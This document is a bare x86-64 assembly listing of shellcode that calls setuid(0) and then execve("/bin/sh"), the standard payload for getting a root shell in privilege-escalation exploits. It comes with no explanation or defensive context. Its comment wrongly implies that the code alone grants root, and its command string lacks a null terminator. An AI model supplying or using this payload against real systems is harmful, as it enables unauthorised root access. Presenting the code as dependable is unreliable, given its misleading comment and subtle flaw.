.text

.global _start
_start:
    # setuid(0)
    xor    %eax, %eax
    xor    %edi, %edi
    mov    $105, %al
    syscall             # all instructions after this point run as UID=0 (root)

    # execve("/bin/sh", NULL, NULL)
    lea    cmd(%rip), %rdi
    xor    %esi, %esi
    xor    %edx, %edx
    mov    $59, %eax
    syscall

    # exit(0)
    xor    %edi, %edi
    mov    $60, %eax
    syscall


.section .rodata

cmd:
    .ascii    "/bin/sh"
